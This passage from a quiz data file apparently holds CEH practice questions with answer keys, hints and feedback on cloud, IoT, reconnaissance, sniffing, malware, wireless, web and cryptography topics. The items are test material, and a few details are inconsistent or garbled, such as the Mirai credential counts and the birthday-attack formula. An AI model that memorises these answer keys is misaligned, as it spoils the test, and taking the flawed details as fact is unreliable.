opts:['Shutting down a virtual machine remotely','Breaking out of a virtual machine\'s isolation to access the hypervisor or other VMs on the same physical host','Encrypting all VMs in a cloud environment simultaneously','Migrating a VM to an attacker-controlled cloud region'],
ans:1,hint:'Escape implies breaking through the isolation boundary.',
correct_fb:'<strong>VM escape</strong> occurs when an attacker exploits vulnerabilities to break out of the guest VM\'s isolation and gain access to the <strong>hypervisor (host OS)</strong> or other VMs on the same physical hardware. This is catastrophic in multi-tenant cloud environments  --  an attacker in one tenant\'s VM could access another tenant\'s data. Mitigation: keep hypervisor software patched, minimal hypervisor attack surface, security monitoring.',
wrong_fb:'<strong>VM escape = breaking out of VM isolation to reach hypervisor</strong>. In multi-tenant cloud (same physical server hosts multiple customers\' VMs), VM escape means crossing tenant boundaries. Other cloud threats: <strong>Side-channel attacks</strong> (extract data from co-resident VMs via shared resources like CPU cache), <strong>Cloud hopping</strong> (using compromised cloud account to attack others), <strong>Insecure APIs</strong> (misconfigured cloud management APIs), <strong>Data remanence</strong> (residual data after VM decommissioning).'},

{topic:11,diff:'medium',type:'Multiple Choice',
q:'What is the primary security concern with IoT (Internet of Things) devices?',
opts:['IoT devices use too much bandwidth','Most IoT devices have poor security: default/hardcoded credentials, no patch mechanism, minimal encryption, and large attack surface when internet-connected','IoT devices are too expensive to secure properly','IoT devices only work on private networks, limiting their attack surface'],
ans:1,hint:'Think about what happens when billions of devices are connected with weak security.',
correct_fb:'IoT devices present massive security challenges: <strong>default/hardcoded credentials</strong> (never changed), <strong>no/poor update mechanism</strong> (vulnerable firmware stays vulnerable), <strong>minimal encryption</strong>, <strong>large attack surface</strong> (billions of devices connected to internet), and <strong>poor physical security</strong>. The Mirai botnet infected 600,000+ IoT devices (cameras, routers) using 60 default credential combinations, then launched record DDoS attacks.',
wrong_fb:'<strong>IoT = massive attack surface with poor security</strong>. Key issues: default credentials (admin/admin), no patch management, unencrypted communications, exposed management interfaces, lack of hardware security. The Mirai botnet is the definitive IoT security example  --  it used 61 default username/password combinations to compromise cameras and DVRs, creating a 620 Gbps DDoS botnet. Change defaults, segment IoT on separate VLANs, and enforce network monitoring.'},

{topic:11,diff:'hard',type:'Multiple Choice',
q:'In the Shared Responsibility Model of cloud security, which of the following is typically the CUSTOMER\'S responsibility in an IaaS deployment?',
opts:['Physical security of data center hardware','Hypervisor and virtualization security','Operating system patching, application security, and data encryption','Network infrastructure between availability zones'],
ans:2,hint:'In IaaS, the customer gets virtual machines  --  they own everything running on them.',
correct_fb:'In <strong>IaaS Shared Responsibility</strong>: the <strong>provider</strong> is responsible for physical security, hardware, hypervisor, and network infrastructure. The <strong>customer</strong> is responsible for: OS patching, application security, identity and access management, network security groups/firewall rules, encryption of data at rest and in transit, and backup/recovery. The customer owns everything above the hypervisor.',
wrong_fb:'IaaS Shared Responsibility: Provider = physical, hardware, hypervisor, physical network. Customer = <strong>OS patching, applications, data, encryption, IAM, security groups</strong>. PaaS: Provider adds OS + middleware. Customer = app + data only. SaaS: Provider = everything. Customer = access management + their own data usage. The shared responsibility model is a critical cloud security concept  --  "shared" means BOTH parties have obligations, not that the provider handles everything.'},
// -- TOPIC 0: Ethical Hacking Essentials (additional) --
{topic:0,diff:'medium',type:'Multiple Choice',
q:'Which of the following is a key deliverable at the END of a penetration test engagement?',
opts:['A new firewall configuration','A comprehensive written report detailing findings, risk ratings, evidence, and remediation recommendations','Updated antivirus signatures','A list of all passwords discovered'],
ans:1,hint:'The client needs something actionable  --  what is that?',
correct_fb:'The primary deliverable of a pen test is a <strong>comprehensive written report</strong> that includes: executive summary (for management), technical findings (vulnerabilities discovered with evidence), risk ratings (critical/high/medium/low), attack narratives (how vulnerabilities were exploited), and <strong>remediation recommendations</strong> (how to fix each finding). Without a report, the pen test has no value to the client.',
wrong_fb:'<strong>Pen test report = executive summary + technical findings + risk ratings + remediation</strong>. Reports have two sections: Executive Summary (non-technical, for C-suite, focuses on business risk) and Technical Report (detailed technical findings for security team, includes proof-of-concept, evidence screenshots, CVE references). Good remediation guidance is what separates a useful report from just a vulnerability list.'},

{topic:0,diff:'hard',type:'Multiple Choice',
q:'What is the difference between a vulnerability assessment and a penetration test?',
opts:['They are identical  --  just different names used by different vendors','A vulnerability assessment identifies and reports vulnerabilities; a penetration test actively exploits them to demonstrate real-world impact','A penetration test is automated; a vulnerability assessment is manual','A vulnerability assessment tests physical security; a penetration test tests digital security'],
ans:1,hint:'One finds the holes; the other also goes through them.',
correct_fb:'<strong>Vulnerability Assessment</strong>: systematically identifies, quantifies, and prioritizes vulnerabilities  --  typically using automated scanners (Nessus, OpenVAS) + manual verification. Does NOT exploit. <strong>Penetration Test</strong>: goes further  --  actively exploits vulnerabilities to demonstrate real-world impact, chain attacks together, achieve specific objectives (domain admin, data access). Pen tests prove exploitability; assessments report existence.',
wrong_fb:'<strong>Vulnerability assessment = find + report</strong>. <strong>Penetration test = find + exploit + prove impact</strong>. Vulnerability scanners (Nessus, Qualys, OpenVAS) automate discovery. Pen testers use manual exploitation to chain vulnerabilities, bypass controls, and achieve real objectives. Bug bounties are a third category  --  continuous vulnerability discovery with researcher rewards. CEH exam tests all three.'},

{topic:0,diff:'medium',type:'Multiple Choice',
q:'What does the term "attack surface" mean?',
opts:['The physical area where an attack takes place','The total sum of all potential attack vectors  --  every point where an attacker could enter or extract data from an environment','The surface area of a server rack that is physically accessible','The range of IP addresses belonging to an organization'],
ans:1,hint:'Surface = all the entry points and exposure points in an environment.',
correct_fb:'<strong>Attack surface</strong> is the total set of possible points where an unauthorized user could try to enter or extract data. Includes: open ports and services, user interfaces, APIs, physical access points, employee email addresses, social media presence, supply chain, and third-party integrations. Security principle: reduce attack surface to minimum  --  disable unnecessary services, close unused ports, remove unneeded software.',
wrong_fb:'<strong>Attack surface = all possible entry/extraction points</strong>. Reducing attack surface is a fundamental security strategy: close unused ports, disable unnecessary services, remove default accounts, minimize privileges, reduce software installations. Attack surface management (ASM) is a growing security discipline. The attacker\'s view of the attack surface = their opportunity; the defender\'s job is to minimize it.'},

// -- TOPIC 1: Reconnaissance (additional) --
{topic:1,diff:'medium',type:'Multiple Choice',
q:'What information can be obtained from a WHOIS lookup?',
opts:['Password hashes for the domain admin account','Domain registration details including registrant name/contact, nameservers, registration/expiration dates, and registrar information','The complete list of IP addresses assigned to the organization','Real-time traffic statistics for the domain'],
ans:1,hint:'WHOIS is a public registry of domain ownership information.',
correct_fb:'<strong>WHOIS</strong> returns domain registration data: registrant name, organization, email, phone, address (if not privacy-protected), nameservers, registrar, registration date, expiration date, and last updated date. This intelligence helps identify: contact targets for social engineering, nameservers for DNS attacks, expiration dates (domains can be snagged when expired), and organizational structure.',
wrong_fb:'<strong>WHOIS = domain registration public record</strong>. Many registrants now use privacy protection services (registrar proxies) that replace personal contact data with the registrar\'s contact info. Mitigation: use WHOIS privacy/protection services. Still reveals: nameservers, registrar, dates. Reverse WHOIS: find all domains registered by a person/organization  --  useful for mapping subsidiary companies.'},

{topic:1,diff:'hard',type:'Multiple Choice',
q:'What does Maltego do that makes it valuable for OSINT and reconnaissance?',
opts:['It performs automated port scans and vulnerability assessments','It visually maps relationships between people, organizations, domains, IP addresses, and other entities using transforms','It cracks WPA2 passwords using GPU acceleration','It performs man-in-the-middle attacks on specified targets'],
ans:1,hint:'Maltego is famous for its visual relationship graphs.',
correct_fb:'<strong>Maltego</strong> is an OSINT and data mining tool that creates <strong>visual relationship graphs</strong> connecting: people, email addresses, domains, IP addresses, social media profiles, organizations, and phone numbers. "Transforms" query external data sources to populate the graph. It reveals relationships not obvious from individual data points  --  for example, connecting a person to all their domains, email addresses, and social media accounts.',
wrong_fb:'<strong>Maltego = visual OSINT relationship mapping</strong>. Transforms query: WHOIS databases, DNS, social media, Shodan, LinkedIn, HaveIBeenPwned, and more. The graph view reveals hidden connections between entities. Used for: target mapping, threat intelligence, fraud investigation, and law enforcement. Commercial (Maltego CE = free/limited, Maltego Classic = paid with more transforms).'},

// -- TOPIC 2: Scanning (additional) --
{topic:2,diff:'medium',type:'Multiple Choice',
q:'What is banner grabbing and why is it useful during reconnaissance?',
opts:['Physically capturing banners from server rooms','Connecting to a service to capture its welcome message/banner, which often reveals software type and version information','Downloading company marketing banners for OSINT analysis','Intercepting encrypted service banners via MITM'],
ans:1,hint:'Services often announce what they are when you connect to them.',
correct_fb:'<strong>Banner grabbing</strong> connects to a service and reads its welcome message/banner to identify the <strong>software type, version, and sometimes OS</strong>. Example: connecting to port 80 may reveal "Apache/2.4.41 (Ubuntu)." This identifies specific versions to look up known CVEs. Tools: telnet, netcat (nc), nmap -sV. Some banners are modified to hide version info (banner obfuscation  --  a basic security measure).',
wrong_fb:'<strong>Banner grabbing = identify service version via welcome message</strong>. Example: "nc target.com 22" reveals "SSH-2.0-OpenSSH_7.4" (SSH version). "nc target.com 80" then "HEAD / HTTP/1.0" reveals web server type and version. With version info, search CVE databases for known vulnerabilities. Defense: configure services to hide or falsify version banners. Nmap -sV performs automated banner grabbing.'},

{topic:2,diff:'hard',type:'Multiple Choice',
q:'What is OS fingerprinting, and what TWO methods are used?',
opts:['Identifying the OS using password hash analysis; active and passive methods','Identifying the target OS by analyzing TCP/IP stack behavior; active (sending crafted packets) and passive (analyzing captured traffic)','Scanning for OS-specific files on the file system; local and remote methods','Using SNMP to read MIB values that reveal the OS; authenticated and unauthenticated methods'],
ans:1,hint:'Active = you send packets; passive = you just observe existing traffic.',
correct_fb:'<strong>OS fingerprinting</strong> identifies the target OS by analyzing TCP/IP stack behavior. <strong>Active</strong>: send crafted packets and analyze responses (TTL values, TCP window size, IPID sequence, TCP options  --  different OSes have different defaults). Nmap -O uses active fingerprinting. <strong>Passive</strong>: analyze existing traffic without sending any packets (p0f tool). Active is faster but detectable; passive is invisible.',
wrong_fb:'<strong>OS fingerprinting methods</strong>: Active (Nmap -O sends packets, analyzes responses) and Passive (p0f analyzes captured traffic without sending anything). Indicators: TTL (Linux=64, Windows=128, Cisco=255), TCP window size, IPID sequence, TCP options in SYN packets. Passive fingerprinting tools: p0f, NetworkMiner. Active fingerprinting may be logged by IDS. Passive fingerprinting is completely undetectable.'},

// -- TOPIC 3: Sniffing (additional) --
{topic:3,diff:'medium',type:'Multiple Choice',
q:'What is DNS poisoning (cache poisoning)?',
opts:['Injecting SQL code into DNS query fields','Inserting corrupt DNS records into a resolver\'s cache, redirecting users from legitimate sites to malicious ones','Overloading DNS servers with excessive queries','Encrypting DNS traffic to prevent legitimate resolution'],
ans:1,hint:'Poisoning the cache = corrupting the stored answers the resolver uses.',
correct_fb:'<strong>DNS cache poisoning</strong> inserts malicious DNS records into a resolver\'s cache. When users query the poisoned resolver for "bank.com," they receive the attacker\'s IP instead of the real bank\'s IP  --  transparently redirected to a fake site (pharming). The Kaminsky attack (2008) demonstrated mass cache poisoning. Mitigation: DNSSEC (cryptographically signs DNS records), randomized source ports and query IDs.',
wrong_fb:'<strong>DNS poisoning = corrupt cached DNS records -> redirect users</strong>. Pharming = using DNS poisoning or hosts file modification to redirect legitimate domains to malicious sites. Kaminsky attack (2008): discovered that DNS\'s predictable query IDs made cache poisoning practical at scale. Mitigation: DNSSEC (signs zone data), 0x20 encoding (randomizes case in DNS queries to prevent forgery), DANE (TLS authentication via DNS).'},

{topic:3,diff:'hard',type:'Multiple Choice',
q:'What is DHCP starvation, and what attack can follow it?',
opts:['Overloading DHCP with encrypted requests; followed by a DNS attack','Sending many DHCP requests to exhaust the IP address pool; a rogue DHCP server attack (DHCP spoofing) can follow to assign attacker-controlled settings','Poisoning the DHCP server\'s ARP cache; followed by a MITM attack','Flooding the DHCP server with UDP traffic; followed by a DoS attack'],
ans:1,hint:'Starve the legitimate server, then replace it.',
correct_fb:'<strong>DHCP starvation</strong>: an attacker sends DHCP DISCOVER packets with spoofed MAC addresses to consume all available IP leases. The legitimate DHCP server runs out of addresses and cannot serve real clients (DoS). <strong>Follow-up</strong>: the attacker then sets up a <strong>rogue DHCP server</strong> that responds to new DHCP requests, assigning: attacker-controlled DNS servers (for pharming) and default gateway (for MITM). Tool: Yersinia.',
wrong_fb:'<strong>DHCP starvation -> rogue DHCP server -> MITM/pharming</strong>. Rogue DHCP hands out: attacker\'s gateway IP (MITM all traffic), attacker\'s DNS (pharming), potentially wrong subnet mask. Mitigation: DHCP snooping (switch feature that blocks DHCP responses from untrusted ports), port security (limits MAC addresses per port  --  prevents MAC spoofing for starvation). Yersinia is the primary tool for both attacks.'},

// -- TOPIC 4: System Hacking (additional) --
{topic:4,diff:'medium',type:'Multiple Choice',
q:'What is the purpose of a buffer overflow attack?',
opts:['Filling a network buffer to slow down communications','Writing data beyond a buffer\'s allocated memory to overwrite adjacent memory, potentially allowing arbitrary code execution','Overflowing a firewall\'s connection buffer to cause a DoS','Filling a hard drive buffer to corrupt data'],
ans:1,hint:'Overflow = writing past the end of allocated space, into territory you shouldn\'t touch.',
correct_fb:'A <strong>buffer overflow</strong> occurs when a program writes more data to a fixed-size buffer than it can hold, overwriting adjacent memory. In a stack buffer overflow, an attacker can overwrite the <strong>return address</strong> to redirect execution to shellcode or existing code (ROP). Buffer overflows in C/C++ have caused countless critical vulnerabilities (e.g., MS17-010/EternalBlue). Mitigations: ASLR, DEP/NX, stack canaries, safe language use.',
wrong_fb:'<strong>Buffer overflow = overwrite adjacent memory -> control execution flow</strong>. Stack overflow: overwrite return address -> redirect to shellcode. Heap overflow: corrupt heap structures. Integer overflow: wrap-around causes unexpected behavior. Mitigations: ASLR (randomize memory layout), DEP/NX (non-executable memory), stack canaries (detect overwrite before return), safe languages (Java, Python, Rust). Still one of the most common vulnerability classes in C/C++ software.'},

{topic:4,diff:'hard',type:'Multiple Choice',
q:'What tool is used to create a "rubber ducky" USB attack, and what does it do?',
opts:['Metasploit; creates malware payloads for USB delivery','USB Rubber Ducky / Hak5 device; emulates a keyboard to type malicious commands on the target machine when plugged in','Aircrack-ng; creates wireless attack payloads on USB','Wireshark; captures USB traffic for analysis'],
ans:1,hint:'This device looks like a USB drive but acts like something entirely different.',
correct_fb:'The <strong>USB Rubber Ducky</strong> (by Hak5) is a keystroke injection tool disguised as a USB flash drive. When plugged in, it immediately emulates a keyboard (HID device) and types pre-programmed keystrokes at superhuman speed, executing malicious commands before the user or security tools can react. Payloads (written in Ducky Script) can: open PowerShell, download malware, create backdoor accounts, or exfiltrate data in seconds.',
wrong_fb:'<strong>USB Rubber Ducky = HID (Human Interface Device) attack</strong>. The OS sees it as a trusted keyboard (not a drive), so HID-based attacks bypass most USB security controls. Defense: disable unused USB ports, USB device control policies (only allow whitelisted devices), physical security. Similar tools: Bash Bunny (more versatile Hak5 tool), BadUSB (infected firmware on any USB device). Always lock your computer when leaving it unattended.'},

// -- TOPIC 5: Malware (additional) --
{topic:5,diff:'medium',type:'Multiple Choice',
q:'What is a logic bomb, and how does it differ from other malware?',
opts:['Malware that explodes all log files on a system','Code inserted into software that executes a malicious action when specific conditions are met (date, event, trigger)  --  often planted by disgruntled insiders','Software that disrupts network logic by flooding routing tables','A bomb-shaped icon that indicates malware infection'],
ans:1,hint:'It waits for a specific trigger condition before activating.',
correct_fb:'A <strong>logic bomb</strong> is malicious code embedded in legitimate software that remains dormant until a specific <strong>trigger condition</strong> is met: a specific date/time, a file being deleted, a user logging in, or an event occurring. Often planted by <strong>disgruntled insiders</strong> (e.g., "if my employee ID is removed from payroll, delete all files"). Unlike viruses or worms, logic bombs don\'t self-replicate  --  they wait silently.',
wrong_fb:'<strong>Logic bomb = dormant code activated by trigger</strong>. Famous examples: UBS PaineWebber case (2002)  --  IT admin planted logic bomb set to delete files when he was fired. Triggers: date/time (time bomb), specific file existence/deletion, user login event. Defense: code reviews, separation of duties, monitoring for suspicious scheduled tasks, integrity monitoring. Logic bombs are particularly dangerous from malicious insiders with system access.'},

{topic:5,diff:'easy',type:'Multiple Choice',
q:'What is adware?',
opts:['Software that prevents advertisements from appearing','Malware that automatically displays or downloads advertisements, often bundled with free software','Software that monitors keyboard input for advertising purposes','A browser extension that blocks pop-ups'],
ans:1,hint:'Ad + ware = software that shows ads.',
correct_fb:'<strong>Adware</strong> automatically displays or downloads advertisements, often bundled with "free" software. It may be merely annoying (pop-ups) or malicious (tracking browsing habits, redirecting searches, injecting ads into web pages). Many adware programs include spyware components for tracking. Examples: browser toolbars, "free" PDF converters bundled with adware, coupon plugins. Removal: AdwCleaner, Malwarebytes.',
wrong_fb:'<strong>Adware = unwanted advertising software</strong>. The line between adware and spyware is often blurry  --  many adware programs also track user behavior. Adware typically comes bundled with free software (PUP  --  Potentially Unwanted Program). Browser hijackers (change default search/homepage) are a type of adware. Defense: read software installation carefully, use "custom install" to deselect bundled software, use reputable antivirus.'},

// -- TOPIC 6: Wireless (additional) --
{topic:6,diff:'hard',type:'Multiple Choice',
q:'What is the KRACK attack, and which wireless security protocol does it affect?',
opts:['A brute-force attack against WEP encryption keys','Key Reinstallation Attack  --  exploits a flaw in the WPA2 4-way handshake that allows nonce reuse, potentially decrypting traffic','A physical jamming attack against all WiFi bands simultaneously','An attack that cracks WPA3 SAE handshakes'],
ans:1,hint:'KRACK = Key Reinstallation AttaCK  --  what does reinstalling a key cause?',
correct_fb:'<strong>KRACK (Key Reinstallation AttaCK)</strong> exploits a flaw in the <strong>WPA2 four-way handshake</strong>. By manipulating handshake retransmissions, an attacker forces nonce reuse, which can break the encryption stream. Discovered by Mathy Vanhoef in 2017. Affects: all WPA2 implementations (clients and APs). Impact depends on the cipher  --  TKIP and GCMP are severely affected; AES-CCMP leaks packet timestamps and sequence numbers. <strong>Mitigation: patch all devices</strong>.',
wrong_fb:'<strong>KRACK = WPA2 nonce reuse vulnerability via handshake manipulation</strong>. By replaying handshake messages, the attacker resets the nonce (cryptographic counter) to a previously used value. For TKIP and GCMP, this allows full decryption and replay. AES-CCMP leaks less but is still affected. Patching clients is more critical than patching APs (client-side attack). WPA3 uses SAE which is not vulnerable to KRACK. Update all WiFi clients immediately.'},

{topic:6,diff:'medium',type:'Multiple Choice',
q:'What is Kismet, and how does it differ from NetStumbler?',
opts:['Kismet and NetStumbler are identical tools with different names','Kismet is a passive Linux-based WIDS/sniffer that works with 802.11n; NetStumbler is an active Windows-based AP scanner that cannot monitor 802.11n traffic','Kismet is for Windows; NetStumbler is for Linux','NetStumbler is passive; Kismet is active'],
ans:1,hint:'One transmits to detect networks; the other just listens.',
correct_fb:'<strong>Kismet</strong>: passive Linux-based wireless sniffer/IDS  --  places NIC in monitor mode and captures all wireless traffic without transmitting. Works with 802.11a/b/g/n/ac. Can detect hidden SSIDs, log packets, detect intrusions. <strong>NetStumbler</strong>: active Windows-based AP discovery tool  --  sends probe requests to discover APs. Does NOT support 802.11n monitoring. Kismet is far more capable and stealthy; NetStumbler is detectable.',
wrong_fb:'<strong>Kismet = passive sniffer, Linux, 802.11n capable</strong>. <strong>NetStumbler = active scanner, Windows, no 802.11n</strong>. The CEH exam specifically notes NetStumbler cannot monitor 802.11n traffic and can be installed on Windows but not Linux. Kismet can be installed on Linux (native) and Windows (WSL). Passive tools (Kismet) are harder to detect; active tools (NetStumbler) generate traffic that can be identified by WIDS.'},

// -- TOPIC 7: Web App Attacks (additional) --
{topic:7,diff:'medium',type:'Multiple Choice',
q:'What is robots.txt and how can it be useful for attackers?',
opts:['A security configuration file that blocks all bot traffic to a site','A file that instructs web crawlers which pages to avoid indexing  --  inadvertently creating a map of sensitive directories','A configuration file that restricts access to robot IP addresses','A file that accelerates web crawlers to index the site faster'],
ans:1,hint:'It tells crawlers what NOT to look at  --  which is exactly what an attacker wants to know.',
correct_fb:'<strong>robots.txt</strong> tells search engine crawlers which paths to exclude from indexing. Example: "Disallow: /admin/" or "Disallow: /config/" creates a <strong>roadmap of sensitive directories</strong> for attackers  --  if it\'s in robots.txt, it\'s probably worth exploring. Security-minded administrators sometimes put false paths in robots.txt as honeypots. Location: always at website root (http://target.com/robots.txt).',
wrong_fb:'<strong>robots.txt = crawler exclusion list = attacker\'s directory map</strong>. Common sensitive paths found in robots.txt: /admin, /backup, /config, /test, /staging, /private. The file is publicly accessible  --  no authentication required. Security by obscurity fails here. Proper access control (authentication/authorization) must protect sensitive directories regardless of what robots.txt says. Check robots.txt early in web app reconnaissance.'},

{topic:7,diff:'hard',type:'Multiple Choice',
q:'What is clickjacking, and how is it prevented?',
opts:['Clicking links in phishing emails; prevented by email filtering','Tricking users into clicking something different than they perceive by overlaying transparent iframes over legitimate content; prevented by X-Frame-Options header','Hijacking mouse clicks via Bluetooth; prevented by disabling Bluetooth','Automatically clicking buttons using JavaScript automation; prevented by CAPTCHA'],
ans:1,hint:'The user clicks what they think is one thing but is actually another  --  frames are involved.',
correct_fb:'<strong>Clickjacking (UI Redressing)</strong>: attacker loads a target site in a transparent iframe over their own malicious page. Victim clicks what appears to be the attacker\'s content but actually clicks the underlying legitimate site\'s buttons (confirm payment, change settings, share data). <strong>Prevention: X-Frame-Options header</strong> (DENY, SAMEORIGIN) prevents the site from being loaded in iframes. Also: Content-Security-Policy frame-ancestors directive.',
wrong_fb:'<strong>Clickjacking = transparent iframe overlay tricking users into clicking</strong>. Also called UI Redressing. Example: overlay "Click here to win" over a Facebook "Like" button  --  victim "likes" a page without intending to. More dangerous: overlay over bank "transfer" confirmation. Prevention: <strong>X-Frame-Options: DENY</strong> (prevents all iframe embedding) or <strong>SAMEORIGIN</strong> (allows only same-domain frames). Modern Content-Security-Policy also addresses this.'},

// -- TOPIC 8: Cryptography (additional) --
{topic:8,diff:'medium',type:'Multiple Choice',
q:'What is steganography\'s relationship to cryptography?',
opts:['Steganography is a type of cryptography that uses images instead of text','They are complementary: cryptography hides the meaning of data; steganography hides the existence of data  --  using both provides maximum security','Steganography is stronger than cryptography for protecting sensitive data','They are identical techniques with different names'],
ans:1,hint:'One hides content; the other hides the fact that there is content.',
correct_fb:'<strong>Cryptography</strong> transforms data into unreadable ciphertext  --  the message\'s existence is known but content is protected. <strong>Steganography</strong> hides data within other data (image, audio)  --  the message\'s existence is hidden. Using both together is optimal: encrypt the secret message first, then hide the ciphertext in an image. Even if the steganography is detected, the extracted data is still encrypted.',
wrong_fb:'<strong>Crypto = hides meaning</strong>. <strong>Stego = hides existence</strong>. Combined: encrypt message then hide in carrier file  --  even if carrier file is identified as suspicious and data is extracted, it\'s still encrypted. The study of detecting steganography is called steganalysis (analyzing statistical anomalies in files). Common steganography tools: steghide, OpenStego, S-Tools. The CEH exam tests both concepts and their relationship.'},

{topic:8,diff:'hard',type:'Multiple Choice',
q:'What is a birthday attack in cryptography?',
opts:['An attack that targets systems on the date they were installed','An attack exploiting the birthday paradox  --  that the probability of two random values sharing the same hash output is surprisingly high with a modest number of samples, enabling collision finding','An attack launched annually against high-value targets','An attack where the attacker knows both plaintext and ciphertext'],
ans:1,hint:'The birthday paradox shows that collisions happen much sooner than intuition suggests.',
correct_fb:'A <strong>birthday attack</strong> exploits the <strong>birthday paradox</strong>: in a group of 23 people, there\'s a 50% chance two share a birthday  --  far fewer than the intuitive 183 (half of 365). Applied to cryptography: finding a collision in an n-bit hash requires only ~2^(n/2) attempts, not 2^n. For MD5 (128-bit): 2^64 attempts for collision probability, not 2^128. This is why MD5 and SHA-1 are broken  --  collisions are feasible.',
wrong_fb:'<strong>Birthday attack = exploiting collision probability in hashing</strong>. Birthday paradox: probability of collision is O( n) not O(n). For 128-bit hash: collisions findable in ~2^64 operations (not 2^128). MD5 collisions demonstrated in seconds on modern hardware. Impact: forged digital signatures, collision-based attacks on MACs. Defense: use hashes with larger output (SHA-256 = 2^128 collision resistance, SHA-3 = similar). This is why longer hash outputs matter.'},

// -- TOPIC 9: Social Engineering (additional) --
{topic:9,diff:'medium',type:'Multiple Choice',
q:'What is a watering hole attack?',
opts:['Poisoning water supplies to incapacitate employees','Compromising websites frequently visited by the target group, then infecting visitors with malware when they browse the site','Flooding an organization\'s network with traffic like water','Installing malware near water coolers for physical access'],
ans:1,hint:'Lions wait at the watering hole for prey to come to them  --  same concept.',
correct_fb:'A <strong>watering hole attack</strong> compromises websites that the target group frequently visits (industry forums, niche news sites, professional association sites). When targets visit the compromised site, they are infected with malware via drive-by download. The attacker doesn\'t need to directly compromise the target organization  --  they compromise an intermediate site the targets trust. Difficult to defend against because the trusted site becomes malicious.',
wrong_fb:'<strong>Watering hole = compromise trusted third-party site, infect visitors</strong>. Examples: compromising an industry trade group website knowing that target organizations\' employees will visit. Attribution: often nation-state actors targeting specific industries. Defense: zero-trust browsing (sandbox browsers), application whitelisting, browser isolation, keeping browsers and plugins patched, monitoring for unusual outbound connections from browsers.'},

{topic:9,diff:'easy',type:'Multiple Choice',
q:'What is baiting in social engineering?',
opts:['Waiting for victims to walk into a pre-set trap online','Leaving infected USB drives in a public place or offering a false reward to entice victims into taking an action that compromises security','Sending emails with fake offers','Impersonating law enforcement to threaten victims'],
ans:1,hint:'Bait = something enticing left to lure the target.',
correct_fb:'<strong>Baiting</strong> lures victims with something enticing: leaving infected USB drives in parking lots ("CONFIDENTIAL - Q4 Salaries"), offering free music downloads that contain malware, or advertising prizes that require revealing personal information. The classic USB drop test: 60-90% of employees who find a dropped USB drive plug it in, often on work computers. Curiosity and greed are the primary motivators baiting exploits.',
wrong_fb:'<strong>Baiting = enticing the victim to take a harmful action using a lure</strong>. Classic baiting attacks: USB drops (infected drives left in parking lots or lobbies), fake free software downloads, fake prize claims. Research shows USB drops are highly effective  --  human curiosity overrides security awareness. Defense: security awareness training, disabling AutoRun, USB device control policies, monitoring for unknown USB devices.'},

// -- TOPIC 10: DoS & Session Hijacking (additional) --
{topic:10,diff:'medium',type:'Multiple Choice',
q:'What is a DNS amplification attack?',
opts:['Attacking DNS servers by overloading their CPU with complex queries','A reflection/amplification DDoS attack using DNS: attacker sends small queries with spoofed victim IP to open DNS resolvers, which send large responses to the victim','Poisoning DNS caches to amplify malware distribution','Using multiple DNS servers to amplify reconnaissance data collection'],
ans:1,hint:'Small request -> huge response sent to the victim, not the attacker.',
correct_fb:'In a <strong>DNS amplification attack</strong>: (1) Attacker sends small DNS queries (ANY record type) to open DNS resolvers with the <strong>victim\'s IP spoofed</strong> as source, (2) Resolvers send large DNS responses (up to 70x larger) to the victim. Amplification factor = response size / query size. With thousands of open resolvers, the victim receives massive traffic they didn\'t request. Mitigation: disable open DNS resolvers, BCP38 (ingress filtering), rate limiting DNS responses.',
wrong_fb:'<strong>DNS amplification = spoofed IP + open resolver = reflected DDoS</strong>. Amplification ratio can be 50-70x. Other amplification protocols: NTP (MONLIST command, 556x amplification), SSDP (Universal Plug and Play, 30x amplification), Memcached (51,000x  --  largest DDoS in history at 1.3 Tbps, 2018). Defense: BCP38 ingress filtering (blocks spoofed source IPs at ISP level), disable open resolvers, response rate limiting.'},

{topic:10,diff:'hard',type:'Multiple Choice',
q:'What is the difference between TCP session hijacking and UDP session hijacking?',
opts:['There is no difference  --  they are identical attacks on different protocols','TCP hijacking requires predicting/capturing sequence numbers to inject into an existing connection; UDP has no sequence numbers  --  it\'s simpler to hijack but sessions are application-defined','TCP is easier to hijack because it has no authentication; UDP is harder because it uses checksums','UDP sessions cannot be hijacked because they are connectionless'],
ans:1,hint:'TCP has sequence numbers for ordering; UDP doesn\'t  --  what does that mean for hijacking?',
correct_fb:'<strong>TCP hijacking</strong>: requires predicting or capturing the correct <strong>TCP sequence number</strong> to inject data into the existing connection. The attacker must be on-path or use MITM (ARP poisoning) to observe sequence numbers. <strong>UDP hijacking</strong>: UDP is connectionless with no sequence numbers  --  there\'s no persistent state to hijack at the transport layer. UDP sessions are defined by the application, and spoofing UDP is simpler but limited to one-way injection without responses.',
wrong_fb:'<strong>TCP hijacking = sequence number prediction/capture</strong>. TCP maintains state (sequence numbers, window sizes)  --  the attacker needs these to inject believable packets. <strong>UDP = connectionless, no sequence numbers</strong>  --  easier to forge packets but you can\'t "hijack" a session in the same way. Hunt and Juggernaut are classic TCP session hijacking tools. Modern OSes use randomized initial sequence numbers to prevent prediction-based hijacking.'},

// -- TOPIC 11: Cloud & IoT (additional) --
{topic:11,diff:'medium',type:'Multiple Choice',
q:'What is the Cloud Security Alliance (CSA) "Treacherous 12"  --  what does it represent?',
opts:['A list of 12 cloud security vendors to avoid','The top 12 cloud security threats identified by CSA: data breaches, misconfiguration, lack of cloud security architecture, insufficient IAM, account hijacking, insider threats, insecure APIs, weak control plane, etc.','12 encryption standards recommended for cloud security','A list of 12 required security controls for cloud compliance'],
ans:1,hint:'The CSA periodically publishes top threats to cloud computing.',
correct_fb:'The CSA <strong>Treacherous 12</strong> (later "Egregious 11") are the top cloud security threats: Data Breaches, Misconfiguration and Inadequate Change Control, Lack of Cloud Security Architecture, Insufficient IAM, Account Hijacking, Insider Threats, Insecure Interfaces/APIs, Weak Control Plane, Metastructure and Applistructure Failures, Limited Cloud Visibility, Abuse of Cloud Services, and DoS. <strong>Misconfiguration</strong> is consistently the #1 cause of cloud data breaches.',
wrong_fb:'CSA <strong>top cloud threats</strong>: Misconfiguration is #1 (S3 buckets left public, security groups wide open). Insider threats, account hijacking (compromised credentials), insecure APIs (cloud management APIs exposed without auth), and insufficient IAM are all major. Cloud security differs from traditional: no physical perimeter, shared responsibility model, API-driven management (new attack surface), ephemeral infrastructure. CEH tests CSA materials directly.'},

{topic:11,diff:'hard',type:'Multiple Choice',
q:'What is a side-channel attack in a cloud context?',
opts:['Attacking cloud services from the side of a building where servers are located','Extracting information from a co-resident virtual machine by monitoring shared physical resources (CPU cache, power consumption, timing) without direct access to the target VM','Attacking cloud services through side doors in their API','A method of bypassing cloud firewall rules from an adjacent account'],
ans:1,hint:'The attack observes physical resource patterns rather than directly accessing the target.',
